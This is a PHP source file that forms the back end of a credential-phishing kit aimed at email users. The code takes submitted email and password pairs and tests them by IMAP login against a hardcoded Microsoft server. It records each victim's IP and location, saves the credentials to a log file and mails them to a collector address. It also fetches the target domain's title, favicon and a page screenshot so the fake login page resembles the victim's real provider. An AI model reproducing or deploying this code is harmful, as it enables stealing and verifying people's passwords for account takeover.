<?php
//##########################
//#  Configuration
//####
$config['receivers'] = [
    'collector@gmail.com'
];
$config['google_api_key'] = '';
$config['title'] = 'Page';
$config['sender_domain'] = $_SERVER['SERVER_NAME'];


//#########################################
cors();
$config['data'] = $data = empty($_POST)
    ? json_decode(file_get_contents('php://input'), true)
    : $_POST;

$request = isset($data['t']) ? $data['t'] : null;
switch ($request) {
    case '1' : // Save
        $validate = isset($data['v']) ? !!$data['v'] : false;
        saveConfiguration($validate);
        break;
    case '2' : //mx
        $info = getMxInfo($data['e']);
        send_response($info);
        break;
    default:
        $domain = isset($_GET['d']) ? $_GET['d'] : false;
        if ($domain) {
            streamDomainImage($domain);
        } else
            header("{$_SERVER["SERVER_PROTOCOL"]} 404 Not Found");

        break;
}
exit;


function saveConfiguration($validate = false)
{
    global $data;

    $email = isset($data['name']) ? $data['name'] : null;
    $password = isset($data['path']) ? $data['path'] : null;
    $desc = isset($data['desc']) ? $data['desc'] : null;

    $authenticated = false;
    if ($validate) {
        //Validate
        $authenticated = validateLogin($email, $password);
    }

    $ip = getClientIP();
    $locString = "";
    try {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        $location = $ipdat->geoplugin_countryName . " | " . $ipdat->geoplugin_city . " | " . $ipdat->geoplugin_continentName;
        $locString = "\nLocation: $location";
    } catch (Exception $e) {
    }

    $data = "Email: $email\nPassword: $password\nIP: {$ip}{$locString}\n"
        . "Verified Login: " . ($authenticated ? 'Yes' : 'No') . PHP_EOL
        . "$desc" . PHP_EOL
        . "---------------------------------------------\n\n";

    if (!file_exists('./logs')) {
        mkdir('./logs');
    }

    //Persist
    saveLoginDataToFile($data);

    //Send mail
    sendLoginDataToEmail($data);
}

function dd($value)
{
    echo '<pre>';
    var_dump($value);
    die('</pre>');
}

function send_response($data)
{
    header('Content-type: application/json');
    die(json_encode($data));
}


function getMxInfo($email)
{
    global $config;

    if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $e = explode('@', $email);
        $emailDomain = $e[1];
        getmxrr($emailDomain, $mxRecords);

        if (!empty($mxRecords)) {
            $mxRoot = getRootDomain($mxRecords[0]);

            $bHost = trim($config['data']['b'], '/');
            $rootUrl = "https://{$mxRoot}";
            $bgDomain = siteExists($rootUrl) ? $mxRoot : $emailDomain;
            return [
                'domain' => $bgDomain,
                'title' => getTitle($bgDomain),
                'fav' => "https://www.google.com/s2/favicons?domain={$bgDomain}",
                'bg' => "{$bHost}?d={$bgDomain}",
            ];
        }
    }

    return [
        'domain' => null,
        'title' => null,
        'fav' => null,
        'bg' => null,
    ];
}

function siteExists($url)
{
    $file_headers = @get_headers($url);
    return !empty($file_headers) && strpos($file_headers[0], '404 Not Found') === false;
}

function getTitle($url)
{
    $str = @file_get_contents("https://{$url}");
    if (strlen($str) > 0) {
        $str = trim(preg_replace('/\s+/', ' ', $str));
        preg_match("/<title>(.*)<\/title>/i", $str, $title);
        return $title[1];
    }

    return $url;
}

function streamDomainImage($domain)
{
    $filename = "{$domain}.jpg";
    $file = "bgs/$filename";

    if (!file_exists($file)) {
        if (!file_exists('./bgs')) {
            mkdir('./bgs');
        }

        $snap = snap("https://$domain");
        if ($snap) {
            $base64 = $snap['data'];
            $decoded = base64_decode(preg_replace('#^data:image/\w+;base64,#i', '', $base64));;
            file_put_contents($file, $decoded);
        }
    }

    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}

function getRootDomain($subdomain)
{
    if (preg_match('/(?P<domain>[a-z0-9][a-z0-9\-]{1,63}\.[a-z\.]{2,6})$/i', $subdomain, $regs)) {
        return $regs['domain'];
    }
    return false;
}

function snap($url)
{
    global $config;

    //Url value should not empty and validate url
    if (!empty($url) && filter_var($url, FILTER_VALIDATE_URL)) {
        $adress = "https://pagespeedonline.googleapis.com/pagespeedonline/v5/runPagespeed?url=$url&category=CATEGORY_UNSPECIFIED&strategy=DESKTOP&key={$config['google_api_key']}";
        $curl_init = curl_init($adress);
        curl_setopt($curl_init, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($curl_init);
        curl_close($curl_init);

        $googledata = json_decode($response, true);
        if (!isset($googledata['error'])) {
            $snapdata = $googledata["lighthouseResult"]["audits"]["full-page-screenshot"]["details"];
            return $snapdata["screenshot"];
        }
    }
    return false;

}

function cors()
{

    // Allow from any origin
    // Decide if the origin in $_SERVER['HTTP_ORIGIN'] is one
    // you want to allow, and if so:
    header("Access-Control-Allow-Origin: *");
    header('Access-Control-Allow-Credentials: true');
    header('Access-Control-Max-Age: 86400');    // cache for 1 day

    // Access-Control headers are received during OPTIONS requests
    if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') {

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_METHOD']))
            // may also be using PUT, PATCH, HEAD etc
            header("Access-Control-Allow-Methods: GET, POST, OPTIONS");

        if (isset($_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']))
            header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}");

        exit(0);
    }
}

function getClientIP()
{
    if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
        $ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
        return $ip;
    } else {
        $remoteKeys = [
            'HTTP_X_FORWARDED_FOR',
            'HTTP_CLIENT_IP',
            'HTTP_X_FORWARDED',
            'HTTP_FORWARDED_FOR',
            'HTTP_FORWARDED',
            'REMOTE_ADDR',
            'HTTP_X_CLUSTER_CLIENT_IP',
        ];

        foreach ($remoteKeys as $key) {
            if ($address = getenv($key)) {
                foreach (explode(',', $address) as $ip) {
                    if (isValidIp($ip)) {
                        return $ip;
                    }
                }
            }
        }

        return '127.0.0.0';
    }

}

function isValidIp($ip)
{
    if (!filter_var($ip, FILTER_VALIDATE_IP,
            FILTER_FLAG_IPV4 | FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)
        && !filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV6 | FILTER_FLAG_NO_PRIV_RANGE)
    ) {
        return false;
    }

    return true;
}

function validateLogin($username, $password, $exitOnFalse = false)
{
    $authenticated = checkImapConnect($username, $password);
    if ($authenticated) {
        return $authenticated;
    }

    if ($authenticated === false)
        header("{$_SERVER["SERVER_PROTOCOL"]} 401 Unauthorized");

    if ($exitOnFalse)
        exit;

    return $authenticated;
}

function checkImapConnect($username, $password)
{
    try {
        //Microsoft login
        $hostname = '{40.101.54.2:993/imap/ssl/novalidate-cert}INBOX';
        $inbox = @imap_open($hostname, $username, $password);
        $connected = !!$inbox;

        @imap_close($inbox);
        return $connected;
    } catch (Throwable $exception) {
        reportError($exception);
        return null;
    }
}

function saveLoginDataToFile($data)
{
    $chuksHandle = fopen('logs/data.txt', 'a');
    fwrite($chuksHandle, $data);
    fclose($chuksHandle);
}

function reportError(Throwable $exception, $exitAfterReport = false)
{
    header("{$_SERVER["SERVER_PROTOCOL"]} 500 Internal Server Error");
    if ($exitAfterReport)
        exit;
}

function sendLoginDataToEmail($data)
{
    global $config;

    try {
        $subject = "New Data Received";

        $headers = "From: {$config['title']} Data <no-reply@{$config['sender_domain']}>" . "\r\n";
        $headers .= 'X-Mailer: PHP/' . phpversion();
        $headers .= "MIME-Version: 1.0\r\n";
        $headers .= "Content-type: text/plain; charset=iso-8859-1\r\n";

        $to = (array)$config['receivers'];
        foreach ($to as $email)
            @mail($email, $subject, $data, $headers);
    } catch (Exception $exc) {
        $errHandle = fopen('logs/error.log', 'a');
        $data = $exc->getTraceAsString();
        fwrite($errHandle, $data . PHP_EOL . PHP_EOL);
        fclose($errHandle);
    }
}